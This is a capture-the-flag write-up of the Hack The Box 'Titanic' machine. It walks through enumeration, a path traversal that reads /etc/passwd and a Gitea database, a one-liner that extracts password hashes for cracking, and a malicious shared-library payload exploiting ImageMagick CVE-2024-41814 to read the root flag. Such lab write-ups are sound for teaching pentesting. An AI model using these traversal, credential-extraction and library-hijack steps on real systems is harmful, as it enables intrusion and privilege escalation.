
![Capture d'écran 2025-02-20 194259](https://github.com/user-attachments/assets/a37715f4-e765-4ec4-97ec-f3dd0304c793)

This machine is part of **HTB Season 7** and is categorized as an **easy** Linux box. It provides a great learning experience by combining **web enumeration, credential extraction, and privilege escalation**. The challenge revolves around exploring a developer's environment, uncovering sensitive information, and leveraging vulnerabilities to gain root access. Let’s dive in! 
### Setup

Before starting the reconnaissance phase, we need to add the target machine’s IP address to the `/etc/hosts` file:

![Capture d'écran 2025-02-20 194453](https://github.com/user-attachments/assets/3b2f6fdd-c034-4ee8-ae94-93af0f926d1e)

### Recon 

We begin by scanning the target machine (10.10.11.55) for open ports using `nmap`:
`nmap 10.10.11.55 -sV -sC -p- -oN nmapres`


![Capture d'écran 2025-02-20 195653](https://github.com/user-attachments/assets/d3a63423-183a-49f7-bb36-4e77900326dc)

The scan reveals two open ports : 
	`22/tcp
	`80/tcp`

### Enumerating directories with gobuster

We use `gobuster` to discover directories:

`gobuster dir -u titanic.htb  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusteres`

![Capture d'écran 2025-02-20 201433](https://github.com/user-attachments/assets/cdd232aa-1e3c-4f0d-8af2-67f56bbb9204)

This reveals three subdirectories : 
	`/download` (code 400)
	`/book` (code 405)
	`/server-status` (code 403)

### Discovering subdomains with FFUF 

````
ffuf -u http://titanic.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.titanic.htb" -fw 20
````

![Capture d'écran 2025-02-20 202219](https://github.com/user-attachments/assets/5387c517-a434-4e8b-9c21-48be86fc2da0)

The scan reveals a subdomain: **dev.titanic.htb**. We add it to `/etc/hosts` and visit the webpage.

![Capture d'écran 2025-02-20 202944](https://github.com/user-attachments/assets/85df2849-07b4-4d6d-a708-ff58dbece698)

## Exploring the web application

Now we can access to the web page : 

![Pasted image 20250220203131](https://github.com/user-attachments/assets/d9c948dd-54f7-41e1-bbdb-52123fc90b5a)

Upon accessing `dev.titanic.htb`, we find two developer repositories: 

	docker-config
	flask-app

![Capture d'écran 2025-02-20 203936](https://github.com/user-attachments/assets/e837bb0e-d340-4fec-b74f-5b49d1f1eab1)

In `docker-config/mysql`, we discover a `docker-compose.yml` file containing credentials : 

![Capture d'écran 2025-02-20 213249](https://github.com/user-attachments/assets/beb0a1bf-9200-4baf-86fd-b4eff23a676e)

Here we have found the **root password**, **username** and **user's password** of the database.

We can also checked the `flask-app` repository where we can find the `app.py` file : 

![Capture d'écran 2025-02-20 214424](https://github.com/user-attachments/assets/bff8fc94-af4d-485a-819b-94b2ced8e3fd)

Here we can found the **download** route using a **GET** parameter : `ticket`.

![Capture d'écran 2025-02-20 214616](https://github.com/user-attachments/assets/8b8c0377-55e8-4540-b4d7-6abd6fb9b77a)

## Exploiting path traversal

Let's try if we can exploit a potential **Path Traversal attack** on `http://titanic.htb/download?ticket=/etc/passwd`

... and it's worked ! 

This successfully retrieves the `/etc/passwd` file, confirming a vulnerability.

![Capture d'écran 2025-02-20 215106](https://github.com/user-attachments/assets/19014c4f-8613-4224-87bf-f6ca6de34430)

## Extracting gitea credentials

So now that I know that **Path Traversal attack** worked, I switched to `Burp Suite` : 

And we can identify the **developer** user : 

![Capture d'écran 2025-02-20 215740](https://github.com/user-attachments/assets/b65fab45-9208-4a7a-a0f0-1435ce16e1a8)

Based on  [**Gitea documentation**](https://docs.gitea.com/installation/install-with-docker) we locate the `app.ini` file  : 

![Capture d'écran 2025-02-20 222950](https://github.com/user-attachments/assets/e8453d7b-ed62-47e3-a88c-f0e185f254f7)

Then I cheked the `data/gitea/gitea.db` file. So first I've downloaded it and then I and found hashes passwords : 

![Capture d'écran 2025-02-20 223654](https://github.com/user-attachments/assets/24c228ff-7472-446f-b6b8-a126c08c8d80)

Let's check if we can crack any of these...

But first, we need to properly extract each password. To do this, we'll use the following command suggested by **[oxdf](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html)** :

````
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
````

![Capture d'écran 2025-02-20 224908](https://github.com/user-attachments/assets/660c3ff7-6082-4584-a946-2f3e31f0972d)

And we successfully crack two hashes : 

![Capture d'écran 2025-02-22 183335](https://github.com/user-attachments/assets/682cd79d-253a-4c59-95a4-9a3388c78d4c)

We can now try to connect via **ssh** with that password : 

![Capture d'écran 2025-02-20 230017](https://github.com/user-attachments/assets/a13c0226-7c1f-4ef6-a1e8-c7137e40bc20)

From there, we can have access to the **user flag** :

![Capture d'écran 2025-02-20 230146](https://github.com/user-attachments/assets/b1fad3fc-4341-4f0d-b682-b44ea94d23ab)

## Privilege escalation

After enumerating a bit the target machine, I found a script `identify_images.sh` owned by the **root user** and can be executed by the **developer user**. We can supposed that this script is executed every **x** minutes by the **root user**.

![Capture d'écran 2025-02-20 231736](https://github.com/user-attachments/assets/357362b1-ddbe-4c13-8e34-db5d766f6246)

We can see that the script is using **magick** binary so we can first check the version : 

![Capture d'écran 2025-02-21 003735](https://github.com/user-attachments/assets/ecb5dfb3-d9ec-4617-a515-cfb5b0aa3578)

Checking the `ImageMagick` version reveals it is vulnerable to **CVE-2024-41814**  : [CVE](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

![Pasted image 20250221004308](https://github.com/user-attachments/assets/3266fca8-15a1-48ca-8272-a29165a5b25c)

### Exploiting CVE-2024-41814

From the **identify_images.sh** script, we can see that it first changes the directory to `/opt/app/static/assets/images`. It searches for all files with a `.jpg` extension in the directory and its subdirectories using the `find` command and processes each `.jpg` file with the `magick identify` command and appends the output to `metadata.log`.

So we first need to craft a malicious shared library in the current working directory : 

````
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/pwned");
    exit(0);
}
EOF
````

And then we create a fake image file from an existing `jpg` file :  `cp home.jpg root.jpg`

After waiting for `identify_images.sh` to execute, the root flag appears in `/tmp/pwned`.

![Capture d'écran 2025-02-22 181155](https://github.com/user-attachments/assets/f8ad46d0-773d-4430-a82b-b2e185bcad1a)

**Congratulations!** This CTF was a great opportunity to practice essential pentesting techniques, from **reconnaissance** with `nmap`, `gobuster`, and `ffuf` to **web exploitation** through a path traversal vulnerability. It also involved **credential extraction and cracking** using SQLite, followed by **privilege escalation** through an `ImageMagick` vulnerability. Each step highlighted the importance of methodical enumeration and creative exploitation.

I hope you found this writeup insightful. Thanks for reading and happy hacking!

![Capture d'écran 2025-02-21 005228](https://github.com/user-attachments/assets/05e368ee-b21b-4fc5-ad09-e0b883f9aed0)

